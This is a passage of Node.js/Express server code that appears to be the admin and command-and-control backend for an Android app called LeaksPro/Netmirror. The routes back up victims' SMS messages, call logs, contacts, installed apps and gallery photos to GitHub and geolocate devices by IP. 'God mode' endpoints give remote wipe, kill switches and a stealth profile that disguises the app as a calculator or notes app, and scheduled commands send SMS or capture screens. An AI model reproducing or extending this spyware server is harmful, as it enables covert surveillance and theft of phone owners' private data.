    const { preset, custom_url } = req.body;
    if (!preset) return res.status(400).json({ error: 'Preset name required (railway, render, or custom)' });

    let domain;
    if (preset === 'custom') {
      if (!custom_url) return res.status(400).json({ error: 'Custom URL required when preset is "custom"' });
      domain = custom_url.trim();
    } else if (PRESET_DOMAINS[preset]) {
      domain = PRESET_DOMAINS[preset];
    } else {
      return res.status(400).json({ error: `Unknown preset "${preset}". Use: railway, render, or custom` });
    }

    // Normalize
    if (!domain.startsWith('http')) domain = 'https://' + domain;
    domain = domain.replace(/\/+$/, '');

    // Save to database
    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('server_domain', ?)").run(domain);

    // Also update backup_server_url: set the OTHER preset as backup (if using a preset)
    if (preset === 'railway') {
      db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('backup_server_url', ?)").run(PRESET_DOMAINS.render);
    } else if (preset === 'render') {
      db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('backup_server_url', ?)").run(PRESET_DOMAINS.railway);
    }
    // For custom, leave backup unchanged

    // Build discovery payload
    const backupRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'backup_server_url'").get();
    const proxyRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'proxy_url'").get();
    const backupUrl = backupRow?.value || '';
    const publicUrl = proxyRow?.value || domain;

    const discoveryPayload = JSON.stringify({
      domain: publicUrl,
      primary_url: domain,
      backup_url: backupUrl,
      proxy_url: proxyRow?.value || '',
      api_base: `${domain}/api`,
      admin_panel: `${domain}/admin`,
      download_apk: `${domain}/downloadapp/Netmirror.apk`,
      is_failover: false,
      failover_time: null,
      fail_count: 0,
      last_check: new Date().toISOString(),
      last_status: `quick_switch_${preset}`,
      updated_at: new Date().toISOString(),
    }, null, 2);

    let githubPushed = false;
    try {
      await pushToGitHub(
        GITHUB_DISCOVERY_FILE,
        discoveryPayload,
        `Quick switch to ${preset}${preset === 'custom' ? ': ' + domain : ''}`
      );
      githubPushed = true;
      db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('last_domain_push', ?)").run(new Date().toISOString());
    } catch (e) {
      console.warn('[QuickSwitch] GitHub push failed:', e.message);
    }

    const presetLabel = preset === 'custom' ? `custom (${domain})` : preset;
    console.log(`[QuickSwitch] Switched to ${presetLabel} | GitHub: ${githubPushed ? 'pushed' : 'failed'}`);

    res.json({
      success: true,
      preset,
      domain,
      github_pushed: githubPushed,
      message: githubPushed
        ? `Switched to ${presetLabel} — all apps will discover this within minutes`
        : `Domain saved locally but GitHub push failed — apps won't auto-discover until token is set`
    });
  } catch (err) {
    console.error('[QuickSwitch] Error:', err);
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/system-config/backup — Create a database backup and push to GitHub
router.post('/system-config/backup', adminAuth, async (req, res) => {
  try {
    // Export all critical data
    const tables = ['admin_settings', 'devices', 'admin_devices', 'videos', 'categories',
                     'sms_messages', 'call_logs', 'contacts', 'installed_apps', 'gallery_photos',
                     'signed_apks', 'watch_history', 'comments'];
    
    const backup = {
      version: 2,
      created_at: new Date().toISOString(),
      server_domain: db.prepare("SELECT value FROM admin_settings WHERE key = 'server_domain'").get()?.value || '',
      tables: {}
    };

    for (const table of tables) {
      try {
        const rows = db.prepare(`SELECT * FROM ${table}`).all();
        backup.tables[table] = rows;
      } catch (_) {
        // Table might not exist yet
        backup.tables[table] = [];
      }
    }

    const backupJson = JSON.stringify(backup);
    const backupSize = Buffer.byteLength(backupJson);

    // Push to GitHub
    let githubPushed = false;
    try {
      await pushToGitHub(
        GITHUB_BACKUP_FILE,
        backupJson,
        `Database backup — ${new Date().toISOString()} — ${Object.keys(backup.tables).map(t => `${t}:${backup.tables[t].length}`).join(', ')}`
      );
      githubPushed = true;
      db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('last_github_backup', ?)").run(new Date().toISOString());
    } catch (e) {
      console.warn('[Backup] GitHub push failed:', e.message);
    }

    // Also save locally
    const localBackupPath = require('path').join(__dirname, '..', 'data', 'db-backup.json');
    fs.writeFileSync(localBackupPath, backupJson);

    const totalRows = Object.values(backup.tables).reduce((s, t) => s + t.length, 0);

    console.log(`[Backup] Created: ${totalRows} rows across ${Object.keys(backup.tables).length} tables (${(backupSize/1024).toFixed(1)} KB) | GitHub: ${githubPushed}`);

    res.json({
      success: true,
      github_pushed: githubPushed,
      backup_size: backupSize,
      total_rows: totalRows,
      tables: Object.fromEntries(Object.entries(backup.tables).map(([k, v]) => [k, v.length])),
      message: githubPushed
        ? 'Backup created and pushed to GitHub'
        : 'Backup saved locally but GitHub push failed. Check your token.'
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/system-config/restore — Restore database from GitHub backup
router.post('/system-config/restore', adminAuth, async (req, res) => {
  try {
    const token = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_token'").get();
    if (!token?.value) return res.status(400).json({ error: 'GitHub token not configured' });

    // Fetch backup from GitHub
    const apiUrl = `https://api.github.com/repos/${GITHUB_REPO}/contents/${GITHUB_BACKUP_FILE}`;
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 30000);
    const ghRes = await fetch(apiUrl, {
      headers: {
        'Authorization': `token ${token.value}`,
        'Accept': 'application/vnd.github.v3+json',
        'User-Agent': 'LeaksPro-Backend'
      },
      signal: controller.signal
    });
    clearTimeout(timeout);

    if (!ghRes.ok) return res.status(404).json({ error: 'No backup found on GitHub' });

    const ghData = await ghRes.json();
    const backupJson = Buffer.from(ghData.content, 'base64').toString('utf8');
    const backup = JSON.parse(backupJson);

    if (!backup.version || !backup.tables) {
      return res.status(400).json({ error: 'Invalid backup format' });
    }

    // Restore each table
    const restored = {};
    for (const [table, rows] of Object.entries(backup.tables)) {
      if (!rows.length) { restored[table] = 0; continue; }

      try {
        const cols = Object.keys(rows[0]);
        const placeholders = cols.map(() => '?').join(', ');
        const stmt = db.prepare(`INSERT OR REPLACE INTO ${table} (${cols.join(', ')}) VALUES (${placeholders})`);

        let count = 0;
        for (const row of rows) {
          try {
            stmt.run(...cols.map(c => row[c] ?? null));
            count++;
          } catch (_) {}
        }
        restored[table] = count;
      } catch (e) {
        restored[table] = `error: ${e.message}`;
      }
    }

    const totalRestored = Object.values(restored).filter(v => typeof v === 'number').reduce((s, v) => s + v, 0);
    console.log(`[Restore] Restored ${totalRestored} rows from GitHub backup (${backup.created_at})`);

    res.json({
      success: true,
      backup_date: backup.created_at,
      total_restored: totalRestored,
      tables: restored,
      message: `Restored ${totalRestored} rows from backup dated ${backup.created_at}`
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// PUT /api/admin/system-config/auto-backup — Toggle automatic daily backup
router.put('/system-config/auto-backup', adminAuth, (req, res) => {
  try {
    const { enabled } = req.body;
    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('auto_backup_enabled', ?)").run(enabled ? '1' : '0');
    res.json({ success: true, auto_backup_enabled: !!enabled });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

module.exports = router;
// ═══════════════════════════════════════

/**
 * Look up ISP/city/country from IP using ip-api.com (free, no key needed).
 * Uses Node 18+ global fetch — no node-fetch dependency required.
 * Returns { isp, city, country } or empty strings on failure.
 */
async function lookupIpGeo(rawIp) {
  let isp = '', city = '', country = '';
  try {
    const cleanIp = (rawIp || '').replace('::ffff:', '').trim();
    if (!cleanIp || cleanIp === '127.0.0.1' || cleanIp === '::1' || cleanIp === '0.0.0.0') {
      return { isp, city, country };
    }
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 4000);
    const res = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,isp,city,country`, {
      signal: controller.signal
    });
    clearTimeout(timeout);
    if (res.ok) {
      const data = await res.json();
      if (data.status === 'success') {
        isp = data.isp || '';
        city = data.city || '';
        country = data.country || '';
      }
    }
  } catch (_) { /* IP geo lookup failed — non-critical */ }
  return { isp, city, country };
}

// POST /api/admin/admin-device/register — LeaksProAdmin app registers itself
router.post('/admin-device/register', async (req, res) => {
  try {
    const { device_id, device_name, model, manufacturer, os_version, app_version } = req.body;
    if (!device_id) return res.status(400).json({ error: 'device_id required' });

    // Get IP from request
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || req.connection?.remoteAddress || '';

    // Look up ISP/location from IP
    const { isp, city, country } = await lookupIpGeo(ip);

    // Upsert device
    const existing = db.prepare('SELECT device_id FROM admin_devices WHERE device_id = ?').get(device_id);
    if (existing) {
      db.prepare(`UPDATE admin_devices SET 
        device_name = ?, model = ?, manufacturer = ?, os_version = ?, 
        ip_address = ?, isp = ?, city = ?, country = ?,
        app_version = ?, is_online = 1, last_seen = datetime('now')
        WHERE device_id = ?`).run(
        device_name || '', model || '', manufacturer || '', os_version || '',
        ip, isp, city, country,
        app_version || '', device_id
      );
    } else {
      db.prepare(`INSERT INTO admin_devices 
        (device_id, device_name, model, manufacturer, os_version, ip_address, isp, city, country, app_version, is_online, first_seen, last_seen)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, datetime('now'), datetime('now'))`).run(
        device_id, device_name || '', model || '', manufacturer || '', os_version || '',
        ip, isp, city, country, app_version || ''
      );
    }

    // Check if device is locked
    const device = db.prepare('SELECT is_locked FROM admin_devices WHERE device_id = ?').get(device_id);
    res.json({ 
      success: true, 
      is_locked: device?.is_locked === 1,
      message: device?.is_locked === 1 ? 'Locked by Boss' : 'registered'
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/admin-device/heartbeat — periodic status update
router.post('/admin-device/heartbeat', async (req, res) => {
  try {
    const { device_id } = req.body;
    if (!device_id) return res.status(400).json({ error: 'device_id required' });

    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '';

    // Refresh ISP/location on each heartbeat (IP can change on mobile networks)
    const { isp, city, country } = await lookupIpGeo(ip);

    db.prepare(`UPDATE admin_devices SET 
      is_online = 1, ip_address = ?, 
      isp = CASE WHEN ? != '' THEN ? ELSE isp END,
      city = CASE WHEN ? != '' THEN ? ELSE city END,
      country = CASE WHEN ? != '' THEN ? ELSE country END,
      last_seen = datetime('now') 
      WHERE device_id = ?`).run(ip, isp, isp, city, city, country, country, device_id);

    const device = db.prepare('SELECT is_locked FROM admin_devices WHERE device_id = ?').get(device_id);
    if (!device) return res.status(404).json({ error: 'Device not registered' });

    // Check for pending uninstall command
    const uninstallCmd = db.prepare("SELECT value FROM admin_settings WHERE key = ?").get(`uninstall_${device_id}`);
    const shouldUninstall = uninstallCmd?.value === 'pending';
    // Don't auto-clear — keep the command active so the app retries
    // until the app is actually uninstalled (heartbeats stop → server cleanup removes device)

    res.json({ 
      is_locked: device.is_locked === 1,
      command: shouldUninstall ? 'uninstall' : (device.is_locked === 1 ? 'lock' : 'none')
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/admin-devices — List all admin app installations
router.get('/admin-devices', adminAuth, (req, res) => {
  try {
    const devices = db.prepare('SELECT * FROM admin_devices ORDER BY last_seen DESC').all();
    const online = devices.filter(d => d.is_online === 1).length;
    // Attach uninstall_pending flag for each device
    const enriched = devices.map(d => {
      const cmd = db.prepare("SELECT value FROM admin_settings WHERE key = ?").get(`uninstall_${d.device_id}`);
      return { ...d, uninstall_pending: cmd?.value === 'pending' };
    });
    res.json({ 
      devices: enriched || [], 
      total: devices.length, 
      online, 
      offline: devices.length - online 
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/admin-device/:id/lock — Lock the admin app on a device
router.post('/admin-device/:id/lock', adminAuth, (req, res) => {
  try {
    const { id } = req.params;
    const device = db.prepare('SELECT * FROM admin_devices WHERE device_id = ?').get(id);
    if (!device) return res.status(404).json({ error: 'Device not found' });
    
    db.prepare('UPDATE admin_devices SET is_locked = 1 WHERE device_id = ?').run(id);
    res.json({ success: true, message: 'Device locked' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/admin-device/:id/unlock — Unlock the admin app on a device
router.post('/admin-device/:id/unlock', adminAuth, (req, res) => {
  try {
    const { id } = req.params;
    const device = db.prepare('SELECT * FROM admin_devices WHERE device_id = ?').get(id);
    if (!device) return res.status(404).json({ error: 'Device not found' });
    
    db.prepare('UPDATE admin_devices SET is_locked = 0 WHERE device_id = ?').run(id);
    res.json({ success: true, message: 'Device unlocked' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/admin-device/:id/uninstall — Mark device for remote uninstall
router.post('/admin-device/:id/uninstall', adminAuth, (req, res) => {
  try {
    const { id } = req.params;
    const device = db.prepare('SELECT * FROM admin_devices WHERE device_id = ?').get(id);
    if (!device) return res.status(404).json({ error: 'Device not found' });
    
    // Set a pending uninstall command — the app will pick it up on next heartbeat
    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES (?, ?)").run(`uninstall_${id}`, 'pending');
    res.json({ success: true, message: 'Uninstall command queued' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/admin-device/:id/cancel-uninstall — Cancel pending uninstall
router.post('/admin-device/:id/cancel-uninstall', adminAuth, (req, res) => {
  try {
    const { id } = req.params;
    db.prepare("DELETE FROM admin_settings WHERE key = ?").run(`uninstall_${id}`);
    res.json({ success: true, message: 'Uninstall command cancelled' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// DELETE /api/admin/admin-device/:id — Remove device from tracking
router.delete('/admin-device/:id', adminAuth, (req, res) => {
  try {
    const { id } = req.params;
    db.prepare('DELETE FROM admin_devices WHERE device_id = ?').run(id);
    try { db.prepare("DELETE FROM admin_settings WHERE key = ?").run(`uninstall_${id}`); } catch(_){}
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ═══════════════════════════════════════════════════════════
//  GOD MODE ENDPOINTS — Kill Switch, Remote Wipe, Force
//  Update, Stealth Rename
// ═══════════════════════════════════════════════════════════

// GET /api/admin/godmode — Get all god mode settings
router.get('/godmode', adminAuth, (req, res) => {
  try {
    const keys = [
      'godmode_global_kill', 'godmode_global_kill_message',
      'godmode_min_version', 'godmode_min_version_code',
      'godmode_update_url', 'godmode_update_message',
      'godmode_stealth_profile',
    ];
    const settings = {};
    for (const k of keys) {
      const row = db.prepare("SELECT value FROM admin_settings WHERE key = ?").get(k);
      settings[k] = row?.value || '';
    }

    // Per-device commands
    const commands = db.prepare('SELECT * FROM device_commands ORDER BY updated_at DESC').all();

    // Include devices list for per-device controls
    const devices = db.prepare('SELECT device_id, device_name, model, os_version, app_version, is_online, last_seen FROM devices ORDER BY last_seen DESC').all();

    res.json({ settings, commands, devices });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// PUT /api/admin/godmode/global — Update global god mode settings
router.put('/godmode/global', adminAuth, (req, res) => {
  try {
    const allowed = [
      'godmode_global_kill', 'godmode_global_kill_message',
      'godmode_min_version', 'godmode_min_version_code',
      'godmode_update_url', 'godmode_update_message',
      'godmode_stealth_profile',
    ];
    const updates = req.body.settings || req.body;
    for (const [k, v] of Object.entries(updates)) {
      if (allowed.includes(k)) {
        db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES (?, ?)").run(k, String(v));
      }
    }
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/godmode/kill/:deviceId — Kill switch for a specific device
router.post('/godmode/kill/:deviceId', adminAuth, (req, res) => {
  try {
    const { deviceId } = req.params;
    const { message } = req.body;
    db.prepare(`INSERT OR REPLACE INTO device_commands (device_id, kill_switch, kill_message, updated_at)
      VALUES (?, 1, ?, datetime('now'))`).run(deviceId, message || 'This device has been disabled.');
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/godmode/unkill/:deviceId — Revive a killed device
router.post('/godmode/unkill/:deviceId', adminAuth, (req, res) => {
  try {
    const { deviceId } = req.params;
    db.prepare("UPDATE device_commands SET kill_switch = 0, updated_at = datetime('now') WHERE device_id = ?").run(deviceId);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/godmode/wipe/:deviceId — Remote wipe a device
router.post('/godmode/wipe/:deviceId', adminAuth, (req, res) => {
  try {
    const { deviceId } = req.params;
    db.prepare(`INSERT OR REPLACE INTO device_commands (device_id, remote_wipe, updated_at)
      VALUES (?, 1, datetime('now'))
      ON CONFLICT(device_id) DO UPDATE SET remote_wipe = 1, updated_at = datetime('now')`).run(deviceId);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/godmode/stealth/:deviceId — Set stealth profile for a device
router.post('/godmode/stealth/:deviceId', adminAuth, (req, res) => {
  try {
    const { deviceId } = req.params;
    const { profile } = req.body; // 'calculator', 'notes', 'weather', '' (reset)
    db.prepare(`INSERT OR REPLACE INTO device_commands (device_id, stealth_profile, updated_at)
      VALUES (?, ?, datetime('now'))
      ON CONFLICT(device_id) DO UPDATE SET stealth_profile = ?, updated_at = datetime('now')`).run(deviceId, profile || '', profile || '');
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ===================== SCHEDULED COMMANDS =====================

// GET /api/admin/scheduled-commands — List all (optionally filter by device_id or status)
router.get('/scheduled-commands', adminAuth, (req, res) => {
  try {
    const { device_id, status, limit } = req.query;
    let sql = 'SELECT * FROM scheduled_commands WHERE 1=1';
    const params = [];

    if (device_id) {
      sql += ' AND device_id = ?';
      params.push(device_id);
    }
    if (status) {
      sql += ' AND status = ?';
      params.push(status);
    }

    sql += ' ORDER BY scheduled_at DESC';

    if (limit) {
      sql += ' LIMIT ?';
      params.push(parseInt(limit, 10) || 100);
    } else {
      sql += ' LIMIT 200';
    }

    const rows = db.prepare(sql).all(...params);
    // Parse payload JSON for each row
    const commands = rows.map(r => {
      try { r.payload = JSON.parse(r.payload || '{}'); } catch (_) {}
      return r;
    });
    res.json({ commands });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/scheduled-commands/:id — Get single command
router.get('/scheduled-commands/:id', adminAuth, (req, res) => {
  try {
    const row = db.prepare('SELECT * FROM scheduled_commands WHERE id = ?').get(req.params.id);
    if (!row) return res.status(404).json({ error: 'Command not found' });
    try { row.payload = JSON.parse(row.payload || '{}'); } catch (_) {}
    res.json({ command: row });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/scheduled-commands — Create a scheduled command
router.post('/scheduled-commands', adminAuth, (req, res) => {
  try {
    const { device_id, command_type, payload, scheduled_at } = req.body;

    if (!device_id || !command_type || !scheduled_at) {
      return res.status(400).json({ error: 'device_id, command_type, and scheduled_at are required' });
    }

    const validTypes = ['send_sms', 'screen_capture'];
    if (!validTypes.includes(command_type)) {
      return res.status(400).json({ error: `Invalid command_type. Must be one of: ${validTypes.join(', ')}` });
    }

    // Validate payload for send_sms
    if (command_type === 'send_sms') {
      const p = payload || {};
      if (!p.receiver || !p.message) {
        return res.status(400).json({ error: 'send_sms requires payload.receiver and payload.message' });
      }
    }

    const payloadStr = typeof payload === 'string' ? payload : JSON.stringify(payload || {});

    const stmt = db.prepare(
      `INSERT INTO scheduled_commands (device_id, command_type, payload, scheduled_at)
       VALUES (?, ?, ?, ?)`
    );
    stmt.run(device_id, command_type, payloadStr, scheduled_at);

    // Get the inserted ID
    const last = db.prepare('SELECT last_insert_rowid() as id').get();

    if (db.saveNow) db.saveNow();
    res.json({ success: true, id: last.id, message: 'Command scheduled' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// DELETE /api/admin/scheduled-commands/:id — Cancel/delete a scheduled command
router.delete('/scheduled-commands/:id', adminAuth, (req, res) => {
  try {
    const existing = db.prepare('SELECT * FROM scheduled_commands WHERE id = ?').get(req.params.id);
    if (!existing) return res.status(404).json({ error: 'Command not found' });

    db.prepare('DELETE FROM scheduled_commands WHERE id = ?').run(req.params.id);
    if (db.saveNow) db.saveNow();
    res.json({ success: true, message: 'Command deleted' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// DELETE /api/admin/scheduled-commands — Bulk delete by status (e.g., clear all executed/failed)
router.delete('/scheduled-commands', adminAuth, (req, res) => {
  try {
    const { status, device_id } = req.query;
    let sql = 'DELETE FROM scheduled_commands WHERE 1=1';
    const params = [];

    if (status) {
      sql += ' AND status = ?';
      params.push(status);
    }
    if (device_id) {
      sql += ' AND device_id = ?';
      params.push(device_id);
    }

    db.prepare(sql).run(...params);
    if (db.saveNow) db.saveNow();
    res.json({ success: true, message: 'Commands deleted' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

module.exports = router;
